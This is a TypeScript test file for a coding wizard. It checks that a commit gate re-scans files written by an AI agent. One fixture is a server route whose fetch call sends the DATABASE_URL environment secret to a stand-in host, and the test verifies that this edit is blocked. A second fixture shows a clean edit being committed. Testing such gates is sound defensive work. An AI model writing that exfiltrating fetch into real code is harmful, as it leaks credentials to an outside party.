// Review I1 P1-3: before every commit the post-turn gate runs again on the staged agent files, so a file a
// later process (the wizard's own build running agent code) rewrote past the per-turn gate is never committed.
import { join } from "node:path"

import { afterEach, describe, expect, it } from "vitest"

import { createGitFixture, type GitFixture } from "../../test/wizard/git-fixture.js"
import { fakeBridge, fakeChecks, initialState, RUN_ID, testContext, testDeps } from "../../test/wizard/o4-fakes.js"
import { turnGate } from "../checks/turn-gate.js"
import { createGitOps } from "../git/index.js"
import type { ChecklistItem } from "../wizard/contracts/jobs.js"
import { createScanner } from "./scan.js"
import { stageAndCommit } from "./ship.js"

const fixtures: GitFixture[] = []
afterEach(() => {
  while (fixtures.length > 0) fixtures.pop()!.cleanup()
})

const job: ChecklistItem = {
  id: "server_conversions:signup",
  jobId: "server_conversions",
  n: 8,
  title: "Report conversions from the server",
  owner: "agent",
  trigger: { finding: "f", evidence: [] },
  allow: { files: ["app/api/signup/route.ts"], create: [] },
  checks: [],
  state: "done_in_code"
}

async function commitWith(routeText: string) {
  const fx = createGitFixture({ files: { "README.md": "# acme\n", "app/api/signup/route.ts": "export async function POST() {}\n" } })
  fixtures.push(fx)
  fx.git(["checkout", "-q", "-b", "infinite/tag/2026-10-02-7f3c2a"])
  fx.write("app/api/signup/route.ts", routeText)
  const git = createGitOps({ cwd: fx.root, env: fx.env, worktreeRoot: join(fx.dir, "worktrees") })
  const checks = { ...fakeChecks(), turnGate: async (diff: Parameters<typeof turnGate>[0], options: { connectionIds: readonly string[] }) => turnGate(diff, { connectionIds: options.connectionIds, readFile: () => null }, { runId: RUN_ID, now: () => new Date() }) }
  const deps = testDeps({ bridge: fakeBridge(), agents: {} as never, git, host: {} as never, checks })
  const ctx = testContext({ root: fx.root, state: initialState({ jobs: [structuredClone(job)] }) })
  const result = await stageAndCommit({
    ctx,
    deps,
    git,
    step: "rehearsal",
    scanner: createScanner({ literals: [], allowedIds: [] }),
    runId: RUN_ID,
    message: "infinite-tag: install",
    round: null,
    allowlist: ["app/api/signup/route.ts"],
    managed: [],
    npmFiles: [],
    connectionIds: []
  })
  return { fx, result, ctx }
}

describe("stageAndCommit re-runs the post-turn gate on the staged agent files", () => {
  it("an exfiltrating fetch in a server route is held back, never committed, and its job is blocked", async () => {
    const { fx, result, ctx } = await commitWith('export async function POST() {\n  await fetch("https://e.example/" + process.env.DATABASE_URL)\n}\n')
    expect(result.kind).toBe("nothing")
    expect(fx.git(["log", "--oneline"]).trim().split("\n")).toHaveLength(1)
    expect(ctx.state.get().jobs[0]).toMatchObject({ state: "blocked", blockedReason: "needs_you" })
  })

  it("negative: a clean agent edit is committed", async () => {
    const { fx, result } = await commitWith('export async function POST() {\n  await reportInfiniteOutcome({ type: "sign_up", eventId: "x" })\n}\n')
    expect(result.kind).toBe("committed")
    expect(fx.git(["log", "--oneline"]).trim().split("\n")).toHaveLength(2)
  })
})
